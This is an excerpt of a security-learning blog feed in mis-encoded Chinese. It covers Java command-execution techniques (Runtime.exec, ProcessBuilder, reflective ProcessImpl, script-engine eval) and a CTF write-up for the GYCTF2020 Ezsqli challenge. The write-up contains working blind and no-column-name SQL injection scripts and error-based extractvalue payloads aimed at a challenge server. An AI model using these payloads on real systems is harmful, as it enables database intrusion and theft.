class="comment">//å¿…é¡»è¦å®ç°åºåˆ—åŒ–æ¥å£æ‰å¯ä»¥è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">boolean</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Javaå‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#Javaå‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="Javaå‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>Javaå‘½ä»¤æ‰§è¡Œå‡½æ•°</h1><h2 id="1-java-lang-Runtime"><a href="#1-java-lang-Runtime" class="headerlink" title="1.java.lang.Runtime"></a>1.java.lang.Runtime</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;notepad&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="string">&quot;cmd /c calc &amp; notepad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        runtime.exec(<span class="string">&quot;cmd.exe /k calc &amp; notepad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        Process start = runtime.exec(<span class="string">&quot;ping sakani.top&quot;</span>);</span><br><span class="line">        InputStream inputStream = start.getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] res = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        inputStream.read(res);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(res,<span class="string">&quot;gbk&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œç¬¬ä¸€ç§æ–¹å¼å‘Šè¯‰æˆ‘ä»¬å¯ä»¥ç”¨æ•°ç»„æ¥ä¼ å…¥å‘½ä»¤ï¼Œç¬¬äºŒç§åˆ™æ˜¯å‘Šè¯‰å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œç¬¬å››ç§åˆ™æ˜¯æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ‰§è¡Œåå¼¹shell,ä½†æ˜¯ç”¨è¯¥æ–¹æ³•çš„æ—¶å€™æˆ‘åªå¾—åˆ°äº†ä¸€æ¡pingçš„æ•°æ®ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºå¯èƒ½å¹¶ä¸æ˜¯å¾ˆé è°±</p>
<p><img src="image-20201103201813595.png" alt="image-20201103201813595"></p>
<h2 id="2-java-lang-ProcessBuilder"><a href="#2-java-lang-ProcessBuilder" class="headerlink" title="2.java.lang.ProcessBuilder"></a>2.java.lang.ProcessBuilder</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    Process start = processBuilder.start();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;cmd.exe &quot;</span>,<span class="string">&quot;/c calc&quot;</span>);</span><br><span class="line">    processBuilder.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹æ³•ä¹Ÿå¯ä»¥æˆåŠŸæ‰§è¡Œå‡½æ•°ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨çš„æ—¶å€™éœ€è¦æŒ‡å®šä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡Œä»€ä¹ˆæ–‡ä»¶ï¼Œç¬¬äºŒä¸ªæ‰æ˜¯å‘½ä»¤</p>
<h2 id="3-java-lang-Processlmpl"><a href="#3-java-lang-Processlmpl" class="headerlink" title="3.java.lang.Processlmpl"></a>3.java.lang.Processlmpl</h2><p>è¿™ç§æ–¹æ³•æ˜¯ProcessBuilderçš„çˆ¶ç±»ï¼Œä½†æ˜¯å› ä¸ºå…¶ä¸ºç§æœ‰ç±»ï¼Œæˆ‘ä»¬éœ€è¦è·å–çš„æ—¶å€™åªèƒ½é€šè¿‡åå°„çš„æ–¹å¼æ¥è·å–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">    Method start = aClass.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">    start.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    start.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è®©æˆ‘æ¯”è¾ƒç–‘æƒ‘çš„æ˜¯è¿™é‡Œä¸ºä»€ä¹ˆæ²¡æœ‰ä½¿ç”¨cmdï¼Œç›´æ¥ä½¿ç”¨çš„nullï¼Œå´å¯ä»¥æˆåŠŸå¾—åˆ°è¿è¡Œå‘¢ï¼Ÿ</p>
<p>ç¨å¾®å®¡è®¡äº†ä»¥ä¸‹æºç ï¼Œçœ‹åˆ°äº†å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> Process <span class="title">start</span><span class="params">(String cmdarray[],   //æ³¨æ„è¿™é‡Œï¼Œä¼ å…¥çš„å°±æ˜¯cmdarray</span></span></span><br><span class="line"><span class="function"><span class="params">                     java.util.Map&lt;String,String&gt; environment,</span></span></span><br><span class="line"><span class="function"><span class="params">                     String dir,</span></span></span><br><span class="line"><span class="function"><span class="params">                     ProcessBuilder.Redirect[] redirects,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">boolean</span> redirectErrorStream)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure>

<p>é¡ºä¾¿è¡¥å……ä¸€ä¸‹åå°„çš„å‡ ä¸ªçŸ¥è¯†ï¼š</p>
<ul>
<li>class.forNameç”¨äºåå°„ç±»ï¼ŒæŒ‡å®šç±»åå³å¯</li>
<li>class.getDeclaredMethod ç”¨äºæ˜ å°„ç±»ä¸­çš„æ–¹æ³•</li>
<li>invoke ï¼Œå¼€å§‹è°ƒç”¨è¯¥æ–¹æ³•ï¼Œ ä¼ å…¥å‚æ•°å³å¯ä½¿ç”¨</li>
</ul>
<h2 id="4-javax-script-ScriptEngineMana"><a href="#4-javax-script-ScriptEngineMana" class="headerlink" title="4. javax.script.ScriptEngineMana"></a>4. javax.script.ScriptEngineMana</h2><p>æœ¬è´¨ä¸Šè¿˜æ˜¯ä½¿ç”¨ä¸Šé¢çš„ä¸‰ç§æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> ScriptException </span>&#123;</span><br><span class="line">    Object scriptEngineManager = <span class="keyword">new</span> ScriptEngineManager().getEngineByExtension(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>);</span><br><span class="line">    System.out.println(scriptEngineManager);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘æ¯”è¾ƒæƒŠè®¶ï¼Œä¸ºä»€ä¹ˆè¾“å‡ºè¯­å¥ä¹Ÿå¯ä»¥æ‰§è¡Œå‘½ä»¤å‘¢ï¼Ÿ</p>
]]></content>
  </entry>
  <entry>
    <title>GYCTF2020Ezsqli</title>
    <url>/2020/11/19/GYCTF2020Ezsqli/</url>
    <content><![CDATA[<h1 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h1><p>ç›²æ³¨ï¼Œæ— åˆ—åæ³¨å…¥ã€‚ä¸€æ ·çš„å°è¯•æ„é€ æ³¨å…¥è¯­å¥ä¹‹åï¼š</p>
<p>è¿™é‡Œåˆ©ç”¨äº†ç½‘ç«™çš„ç‰¹æ€§ï¼Œå½“æ¡ä»¶æˆç«‹çš„æ—¶å€™è¿”å›NU1l,å¤±è´¥çš„æ—¶å€™ï¼Œå°±æ˜¯V&amp;N</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data = &quot;id=if(ascii(  substr( database() ,1,1)  )&gt;100,1,2)#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stringlist = string.digits + string.ascii_letters</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="comment"># for j in stringlist:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">126</span>):</span><br><span class="line">        sql = <span class="string">&quot;if(ascii(  substr( database() ,&#123;&#125;,1)  )&gt;&#123;&#125;,1,2)#&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: sql&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;V&amp;N&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(j)</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥å¾—åˆ°è¡¨åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">givf_grasdpa_pa_pa_pa</span><br></pre></td></tr></table></figure>

<p>ä¹‹åè¿›ä¸€æ­¥å´å¾ˆéš¾äº†ï¼Œå› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“è¯¥æ€ä¹ˆæŸ¥è¯¢ä¸œè¥¿ï¼Œå› ä¸ºinformation_schmeaè¢«è¿‡æ»¤æ‰äº†ï¼Œæ•…åªèƒ½è€ƒè™‘å…¶ä»–æ³¨å…¥ï¼Œåˆ†åˆ«å°è¯•å¯¹innobå’Œsysåº“è¿›è¡Œæ³¨å…¥ï¼ŒæŒ¨ä¸ªå°è¯•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">sys.schema_auto_increment_columns </span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_flattened_keys</span><br></pre></td></tr></table></figure>

<p>æ„é€ è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥è¡¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sql =<span class="string">&quot;if(ascii(  substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()  ),&#123;&#125;,1)  )&gt;&#123;&#125;,1,2)#&quot;</span>.<span class="built_in">format</span>(i, j) <span class="comment"># æ•°æ®è¡¨</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç»“æœ:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">users233333333333333,f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¹‹åæˆ‘ä»¬å› ä¸ºè¢«è¿‡æ»¤äº†oræ— æ³•è·å–è‡ªåŠ¨çš„åå­—ï¼Œåªèƒ½è¿›è¡Œæ— åˆ—åæ³¨å…¥çš„æ“ä½œäº†</p>
<p>é¦–å…ˆå­¦ä¹ äº†ä¸€æ³¢å¸ˆå‚…çš„æ€è·¯ï¼š</p>
<p>åˆ©ç”¨asciiä½çš„åç§»ï¼Œåœ¨æœ¬åœ°è¿›è¡Œå°è¯•</p>
<p><img src="image-20201119145415713.png" alt="image-20201119145415713"></p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ å¦‚æœselect b &gt;select aï¼Œå¦‚æœselect b &gt; select aè¿”å›çš„0</p>
<p>ä¹‹åè¿˜å¯ä»¥è¿›ä¸€æ­¥çš„å»æ„é€ æ‹¼æ¥ï¼š</p>
<p><img src="image-20201119145730124.png" alt="image-20201119145730124"></p>
<p>é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ„é€ å‡ºflagä¹‹åä¸€æ­¥ä¸€æ­¥çš„ä½ç§»æ¨ç®—å³å¯</p>
<p>è¿™é‡Œè´´ä¸Šå¸ˆå‚…çš„è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res += flag</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        hexchar = add(flag + <span class="built_in">chr</span>(char))</span><br><span class="line">        payload = <span class="string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–è¿˜æœ‰äºŒåˆ†æ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&#x27;</span></span><br><span class="line"><span class="comment">#give_grandpa_pa_pa_pa</span></span><br><span class="line"></span><br><span class="line">payload_flag=<span class="string">&#x27;1^((1,\&#x27;&#123;&#125;\&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">132</span></span><br><span class="line">    mid = (low + high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        k = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">        payload = payload_flag.<span class="built_in">format</span>(k)</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        print(payload)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low+high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid ==<span class="number">33</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=<span class="built_in">chr</span>(mid<span class="number">-1</span>)</span><br><span class="line">    print(flag.lower())<span class="comment">#å› ä¸ºå‡ºæ¥çš„flagæ˜¯å¤§å†™ï¼Œè¿™è¾¹å…¨éƒ¨è½¬ä¸ºå°å†™</span></span><br><span class="line">    </span><br><span class="line">print(flag.lower())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="è®°ä¸€ä¸‹æŠ¥é”™æ³¨å…¥"><a href="#è®°ä¸€ä¸‹æŠ¥é”™æ³¨å…¥" class="headerlink" title="è®°ä¸€ä¸‹æŠ¥é”™æ³¨å…¥"></a>è®°ä¸€ä¸‹æŠ¥é”™æ³¨å…¥</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;fl4g&#x27;</span>  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaåŠ¨æ€ä»£ç†</title>
    <url>/2020/11/10/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>JavaåŠ¨æ€ä»£ç†å†å½“å‰çš„Javaä»£ç ä¸­å‡ ä¹éšå¤„å¯è§ï¼Œå› ä¸ºå®ƒæ—¢å¯ä»¥è·å–Javaé™æ€ä»£ç†çš„å¯æ‹“å±•æ€§ï¼Œå¹¶ä¸”å®ƒä¹Ÿå¯ä»¥è®©æˆ‘ä»¬çš„ä»£ç å˜å¾—å¹¶ä¸ç¹çï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæ­£æ˜¯ç”±äºJavaçš„åŠ¨æ€ä»£ç†åŸç†æ˜¯åå°„ï¼Œ<strong>æ•…è¿˜ä¼šå¼•å‡ºå¾ˆå¤šå®‰å…¨é—®é¢˜</strong>ï¼Œæˆ‘ä»¬è¦çŸ¥é“ï¼ŒJavaçš„åå°„æœ¬èº«å°±æ˜¯ä¸å®‰å…¨çš„ä¸€ä»¶äº‹ï¼ˆPrivateé¦–å…ˆå°±å˜å¾—æ¯«æ— æ„ä¹‰äº†ï¼‰</p>
<p>è¯è¯´å›æ¥ï¼Œæƒ³è¦å­¦ä¹ å¥½åŠ¨æ€ä»£ç†ï¼Œåå°„çš„å­¦ä¹ æ˜¯å¿…ä¸å¯å…çš„ï¼Œå¦‚æœæ²¡æœ‰å­¦ä¹ è¿‡æˆ‘å»ºè®®å…ˆå­¦ä¹ åå°„ï¼Œè¿™é‡Œå°†ä¸€äº›APIå†™ç½—åˆ—å‡ºæ¥ï¼Œæ–¹ä¾¿æ²¡æœ‰å­¦è¿‡åå°„ï¼Œæˆ–è€…å¯¹åå°„å¹¶ä¸ç†Ÿæ‚‰çš„è¯»è€…å¯ä»¥é˜…è¯»åé¢çš„æ–‡ç« </p>
<h1 id="åå°„API"><a href="#åå°„API" class="headerlink" title="åå°„API"></a>åå°„API</h1><h2 id="getClass"><a href="#getClass" class="headerlink" title="getClass"></a>getClass</h2><p>[ä¸€ä¸ªå®ä¾‹å¯¹è±¡].getClass ,å°†è¿”å›å®ä¾‹çš„ç±»ï¼Œæˆ‘è¿™é‡Œç”¨å¦‚ä¸‹ä»£ç è¿›è¡Œæ¼”ç¤ºï¼š</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDemo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;dasi&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String secretName = <span class="string">&quot;wuhu&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å½“å‰ä»£ç çš„è¾“å‡ºç»“æœä¸ºï¼š</p>
<p><img src="image-20201110200039318.png" alt="image-20201110200039318"></p>
<p>æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ¥šçš„å‘ç°ï¼Œè·å–äº†è¯¥å¯¹è±¡</p>
<h2 id="getclass-getInterfaces"><a href="#getclass-getInterfaces" class="headerlink" title="getclass().getInterfaces()"></a>getclass().getInterfaces()</h2><p>å…¶å®æˆ‘ä»¬è¯»åå­—ä¹Ÿå¯ä»¥å¾ˆæ¸…æ¥šçš„æ˜ç™½å®ƒçš„ç”¨é€”äº†ï¼Œç”¨äºè·å–å½“å‰çš„ç»§æ‰¿çš„æ¥å£</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass().getInterfaces());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">bark</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">jiao</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDemo</span> <span class="keyword">implements</span> <span class="title">bark</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;dasi&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String secretName = <span class="string">&quot;wuhu&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jiao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;jiao&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿”å›ç»“æœä¸ºï¼š</p>
